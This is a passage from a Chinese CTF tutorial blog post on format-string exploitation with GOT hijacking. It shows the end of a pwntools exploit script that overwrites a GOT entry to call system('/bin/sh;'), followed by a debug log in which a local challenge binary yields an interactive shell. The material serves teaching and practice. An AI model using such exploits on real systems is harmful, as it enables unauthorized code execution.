content:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#通过get打印‘/bin/sh;’文件，执行system(&#x27;/bin/sh;&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"><span class="comment">#通过dir来拿到shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>debug日志如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop$ python <span class="number">1.</span>py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./pwn3&#x27;</span> argv=[<span class="string">&#x27;./pwn3&#x27;</span>] : pid <span class="number">6264</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x80484a0</span> setbuf</span><br><span class="line">[DEBUG] PLT <span class="number">0x80484b0</span> strcmp</span><br><span class="line">[DEBUG] PLT <span class="number">0x80484c0</span> printf</span><br><span class="line">[DEBUG] PLT <span class="number">0x80484d0</span> bzero</span><br><span class="line">[DEBUG] PLT <span class="number">0x80484e0</span> fread</span><br><span class="line">[DEBUG] PLT <span class="number">0x80484f0</span> strcpy</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048500</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048510</span> puts</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048520</span> __gmon_start__</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048530</span> exit</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048540</span> __libc_start_main</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048550</span> __isoc99_scanf</span><br><span class="line">[DEBUG] PLT <span class="number">0x8048560</span> strncmp</span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Desktop/pwn3&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">[DEBUG] Received <span class="number">0x70</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Connected to ftp.hacker.server\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;220 Serv-U FTP Server v6.4 for WinSock ready...\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;rxraclhm\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;put\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x42</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;welcome!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;ftp&gt;please enter the name of the file you want to upload:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0xb</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Cyberangel\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x18</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;then, enter the content:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">25</span> <span class="number">38</span> <span class="number">24</span> <span class="number">73</span>  <span class="number">28</span> a0 04 08  0a                        │%<span class="number">8</span>$s│(···│·│</span><br><span class="line">    00000009</span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;get\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x28</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;ftp&gt;enter the file name you want to get:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0xb</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Cyberangel\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x20</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  b0 7c da f7  <span class="number">26</span> <span class="number">85</span> 04 08  <span class="number">36</span> <span class="number">85</span> 04 08  <span class="number">50</span> 05 d6 f7  │·|··│&amp;···│<span class="number">6</span>···│P···│</span><br><span class="line">    <span class="number">000000</span>10  d0 <span class="number">40</span> da f7  e0 <span class="number">43</span> e8 f7  <span class="number">28</span> a0 04 08  <span class="number">66</span> <span class="number">74</span> <span class="number">70</span> 3e  │·@··│·C··│(···│ftp&gt;│</span><br><span class="line">    00000020</span><br><span class="line">[DEBUG] PLT <span class="number">0x176b0</span> _Unwind_Find_FDE</span><br><span class="line">[DEBUG] PLT <span class="number">0x176c0</span> realloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x176e0</span> memalign</span><br><span class="line">[DEBUG] PLT <span class="number">0x17710</span> _dl_find_dso_for_object</span><br><span class="line">[DEBUG] PLT <span class="number">0x17720</span> calloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x17730</span> ___tls_get_addr</span><br><span class="line">[DEBUG] PLT <span class="number">0x17740</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x17748</span> free</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;put\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;ftp&gt;&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;get\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;enter the file name you want to get:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;/bin/sh;\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;dir\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received <span class="number">0x10e</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    00000020  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">30</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │    │    │    │<span class="number">0</span>   │</span><br><span class="line">    00000030  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    000000a0  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> 04  │    │    │    │   ·│</span><br><span class="line">    000000b0  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    000000d0  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> 3e  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │    │   &gt;│    │    │</span><br><span class="line">    <span class="number">000000e0</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │    │    │    │    │</span><br><span class="line">    000000f0  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">47</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">29</span> a0  04 08 <span class="number">28</span> a0  │    │  Ga│aa)·│··(·│</span><br><span class="line">    <span class="number">00000</span>100  04 08 2a a0  04 08 2b a0  04 08 <span class="number">66</span> <span class="number">74</span>  <span class="number">70</span> 3e        │··*·│··+·│··ft│p&gt;│</span><br><span class="line">    <span class="number">00000</span>10e</span><br><span class="line">                                            <span class="number">0</span>                                                                                                                                  \x04                                      &gt;                              Gaaa)\xa0\x04(\xa0\x04*\xa0\x04+\xa0\x04ftp&gt;$ ls</span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x31</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1.py  edb  Link to edb\tpwn3  pwndbg-dev  smashes\n&#x27;</span></span><br><span class="line"><span class="number">1.</span>py  edb  Link to edb    pwn3  pwndbg-dev  smashes</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;whoami\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;ubuntu\n&#x27;</span></span><br><span class="line">ubuntu</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<p>getshell！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack%20GOT/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack%20GOT/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-03/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/" title="PWN入门（1-3-10）-高级ROP-SROP"><img class="cover" src="https://picsum.photos/seed/blog-cover-05/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PWN入门（1-3-10）-高级ROP-SROP</div></div><div class="info-2"><div class="info-item-1">PWN入门（1-3-10）-高级ROP-SROP 参考资料：https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107512670  signal机制signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：、  kill可不是字面意思–杀死进程KILL功能描述：用于向任何进程组或进程发送信号。  ① 内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态 ② 内核会为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理signal ③ signal返回 ④ 内核为进程恢复之前保留的上下文，恢复进程的执行   内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。 内核会为该进程保存相应的上下文， 主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址 。此时栈的结构如下图所示，我们...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-3%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6%EF%BC%88x86%EF%BC%89/" title="PWN入门（2-1-3）-格式化字符串漏洞进阶（x86）"><img class="cover" src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（2-1-3）-格式化字符串漏洞进阶（x86）</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-1-3）-格式化字符串漏洞进阶（x86） 文章摘自：https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107662273  我们补充一下上一节的内容： 格式化字符串函数介绍格式化字符串函数将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说格式化字符串在利用的时候主要分三个部分  格式化字符串函数 格式化字符串 后续参数  格式化字符串函数输入函数：scanf 输出函数：    函数 基本介绍    printf 输出到stdout   fprintf 输出到执行FILE流   vprintf 根据参数列表格式化输出到stdout   vfprintf 根据参数列表格式化输出到指定FILE流   sprintf 输出到字符串   snprintf 输出指定字节数到字符串   vsprintf 根据参数列表格式化输出到字符串   vsnprintf 根据参数列表格式化输出指定字节到字符串   setproctitle 设置argv   syslog 输出日志   err，ver...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack-GOT"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">查看程序的执行流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">getshell的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">确定格式化字符串偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2puts%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">泄露puts函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BEsystem%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">找system函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96puts%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">覆盖puts函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fmtstr-payload"><span class="toc-number">1.2.2.4.1.</span> <span class="toc-text">fmtstr_payload</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cdir%E6%8B%BFshell"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">执行dir拿shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E9%A1%BE%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">回顾思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" 